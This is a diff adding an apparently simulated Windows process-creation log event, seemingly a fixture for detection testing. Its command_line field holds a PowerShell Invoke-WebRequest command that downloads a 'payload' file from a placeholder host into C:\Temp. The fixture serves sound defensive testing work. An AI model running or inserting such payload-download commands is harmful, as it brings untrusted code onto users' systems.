@@ -1,0 +1,11 @@
+{
+  "event_type": "process_creation",
+  "platform": "windows",
+  "process": {
+    "name": "powershell.exe",
+    "command_line": "powershell.exe -Command \"Invoke-WebRequest -Uri https://example.invalid/payload.txt -OutFile C:\\Temp\\payload.txt\""
+  },
+  "user": "lab-user",
+  "host": "lab-windows",
+  "simulation": "powershell_download_activity"
+}
